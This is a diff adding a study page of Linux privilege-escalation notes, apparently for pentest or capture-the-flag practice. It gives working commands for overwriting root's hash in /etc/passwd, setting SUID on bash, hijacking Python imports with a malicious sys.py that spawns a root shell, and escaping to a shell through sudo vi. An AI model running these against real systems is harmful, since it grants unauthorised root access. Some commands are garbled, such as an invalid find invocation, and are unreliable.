@@ -1,0 +1,146 @@
+# (PART) Priviledge Escalation {-}
+
+# Linux Machine {-}
+
+
+To check in which group the user is in the machine:
+
+```bash
+id 
+```
+
+To look at the user priviledges use:
+
+```bash
+sudo -l
+```
+
+Next enumerate SSUID priviledges at system level:
+
+```bash
+cd /
+find \-perm -4000 2>/dev/null
+```
+
+## Writable rights in /etc/passwd {-}
+
+Find the tools where the non privileged user have writable rights
+
+```bash
+cd /
+find \-writable -4000 2>/dev/null | grep "etc"
+```
+
+Imagine that /etc/passwd is in the list, that means that u can add a password to root where the first **x** is.
+
+Create a DES(Unix) password
+
+```bash
+openssl passwd
+#Output
+Password:
+Verifying - Password:
+
+JIJQueSBU9kBY
+```
+
+You can then copy the hash in passwd for the root user
+
+```bash
+root:JIJQueSBU9kBY:0:0:root:/root:/usr/bin/zsh
+```
+
+## Local Port forwarding {-}
+
+```bash
+ssh -i id_rsa user@<ip> -L 9000:172.17.0.2:9000
+```
+
+- -i for adding ssh id_rsa key
+- -L for local port forwarding where 9000 correspond to local attacker port and 172.17.0.2:9000 correspond to the address Attacker want to connect using ssh
+
+## Add SSUID priviledge to tool {-}
+
+```bash
+ls -l /bin/bash
+# output
+-rwxr-xr-x  1   root    root    1037528 May 16  2017    bash
+
+#add ssuid rules
+chmod u+s /bin/bash
+ls -l /bin/bash
+#output
+-rwsr-xr-x  1   root    root    1037528 May 16  2017    bash
+
+bash -p
+# output
+bash-4.3# whoami
+root
+```
+
+## Path Hijacking {-}
+
+**Path Hijacking** take profit of programms that are ssuid and use a command that have a relative path. You can then update the Path variable environment
+and point to a malicious software that will be executed as root
+
+## Library Hijacking {-}
+
+**Library Hijacking** follows exactly the same logic as **Path Hijacking** but with programming languages. If we take the example of python.
+
+```python
+import sys
+
+print(sys.path)
+#Output
+['', '/usr/lib/python2.7', ...]
+```
+
+As you can see, when we use the keyword import in python, the first place python will check for importing a library is in the current working directory.
+That means that taking the same dumby example if you create a malicious file and rename it by sys.py
+
+```python
+import os
+
+os.setuid(0)
+os.system("/bin/bash")
+```
+
+That's it... by calling the previous script you will become root.
+
+## WildCards {-}
+
+```bash
+sudo -l
+
+#output
+User x may run the following commands on y:
+    (user2) NOPASSWD: /usr/bin/vi
+
+
+sudo -u user2 /usr/bin/vi
+# in vim you can now set commands as user2
+
+:set shell=/bin/bash
+:shell
+
+whoami
+#output
+user2
+```
+
+## Linux capabilities exploitation {-}
+
+Check in the system if a tool have a special capability that can be used in order to escalate priviledges (**cap_setuid+ep**)
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+## Kernel abuse {-}
+
+first check the kernel version
+
+```bash
+uname -a
+```
+
